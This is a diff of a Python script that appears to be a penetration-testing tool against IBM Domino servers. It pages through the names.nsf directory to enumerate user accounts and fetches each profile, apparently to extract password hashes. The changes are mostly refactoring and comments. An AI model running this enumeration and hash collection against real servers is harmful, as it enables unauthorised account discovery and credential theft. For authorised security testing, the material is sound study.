@@ -28,16 +28,18 @@ requests.packages.urllib3.disable_warnings()
 
 # Get user profile URLs
 def enum_accounts(target, header, username, password):
-	session = requests.Session()
-	session.auth = (username, password)
-
 	accounts = []
 	account_urls = []
+
+	session = requests.Session()
+	session.auth = (username, password)
 
 	for page in range(1, 100000, 1000):
 		try:
 			pages = "{0}/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={1}&Count=1000".format(target, page)
 			request = session.get(pages, headers=header, timeout=60, verify=False)
+
+			# Handle 200 response
 			if request.status_code == 200:
 				if 'form method="post"' in request.text:
 					utility.print_warn('Unable to access names.nsf, bad username or password!')
@@ -50,17 +52,22 @@ def enum_accounts(target, header, username, password):
 					else:
 						links = [a.attrs.get('href') for a in soup.select('a[href^=/names.nsf/]')]
 						for link in links:
-							account_regex = re.search("/(([a-fA-F0-9]{32})/([a-fA-F0-9]{32}))", link)
-							if account_regex and account_regex.group(1) not in accounts:
-								accounts.append(account_regex.group(1))
+							account_regex = re.compile('/([a-f0-9]{32}/[a-f0-9]{32})', re.I)
+							if account_regex.match(link) and account_regex.search(link).group(1) not in accounts:
+								accounts.append(account_regex.search(link).group(1))
 							else:
 								pass
+
+			# Handle 401 response
 			elif request.status_code == 401:
 				utility.print_warn('Unable to access names.nsf, bad username or password!')
 				break
+
+			# Handle other responses
 			else:
 				utility.print_warn('Could not connect to Domino server!')
 				break
+
 		except Exception as error:
 			utility.print_error("Error: {0}".format(error))
 			break
@@ -87,6 +94,7 @@ def async_requests(accounts, header, username, password):
 		for account_url in requests.swarm(accounts, maintainOrder=False):	
 			if account_url.status_code == 200:
 				get_domino_hash(account_url)
+
 	except KeyboardInterrupt:
 		requests.stop(killExecuting=True)
 
@@ -94,6 +102,7 @@ def async_requests(accounts, header, username, password):
 def get_domino_hash(response):
 	soup = BeautifulSoup(response.text, 'lxml')
 	try:
+
 		# Get account username
 		username_params = ['$dspShortName', '$dspFullName']
 		for user_param in username_params:
@@ -111,6 +120,7 @@ def get_domino_hash(response):
 				break
 			else:
 				continue
+
 	except:
 		pass
 
